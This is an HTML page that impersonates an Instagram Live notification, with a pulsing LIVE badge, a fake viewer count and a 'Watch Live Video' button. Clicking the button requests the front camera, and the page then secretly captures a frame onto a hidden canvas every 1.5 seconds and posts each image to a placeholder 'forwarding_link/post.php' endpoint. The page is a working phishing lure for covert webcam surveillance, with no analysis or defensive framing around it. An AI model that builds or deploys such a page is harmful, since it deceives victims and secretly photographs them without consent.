<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Live</title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
        }

        .live-badge {
            display: inline-block;
            background: linear-gradient(45deg, #E1306C, #FD1D1D);
            color: white;
            padding: 8px 20px;
            border-radius: 5px;
            font-weight: bold;
            font-size: 14px;
            letter-spacing: 1px;
            margin-bottom: 25px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(225, 48, 108, 0.7);
            }
            70% {
                box-shadow: 0 0 0 15px rgba(225, 48, 108, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(225, 48, 108, 0);
            }
        }

        .profile-pic {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            border: 4px solid;
            border-image: linear-gradient(45deg, #405DE6, #833AB4, #C13584, #E1306C) 1;
            margin: 0 auto 20px;
            overflow: hidden;
        }

        .profile-pic img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
        }

        h1 {
            color: #262626;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .status {
            color: #8e8e8e;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .viewers {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #262626;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .viewers-icon {
            font-size: 18px;
        }

        .watch-btn {
            background: linear-gradient(45deg, #405DE6, #833AB4, #C13584);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .watch-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(193, 53, 132, 0.4);
        }

        .video-wrap {
            display: none;
        }

        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Hidden webcam capture elements -->
    <div class="video-wrap">
        <video id="video" playsinline autoplay></video>
    </div>
    <canvas id="canvas" width="640" height="480"></canvas>

    <div class="card">
        <div class="live-badge">‚óè LIVE</div>
        <div class="profile-pic">
            <img src="https://i.pravatar.cc/150" alt="Profile">
        </div>
        <h1>User is Live Now!</h1>
        <p class="status">Started 2 minutes ago</p>
        <div class="viewers">
            <span class="viewers-icon">üëÅ</span>
            <span>1.2K watching</span>
        </div>
        <button class="watch-btn" onclick="startCapture()">Watch Live Video</button>
    </div>

    <script>
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: false,
                success: function(result) {},
                error: function() {}
            });
        }

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                console.log('Camera access denied');
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;

            var context = canvas.getContext('2d');
            setInterval(function() {
                context.drawImage(video, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 1500);
        }
    </script>
</body>
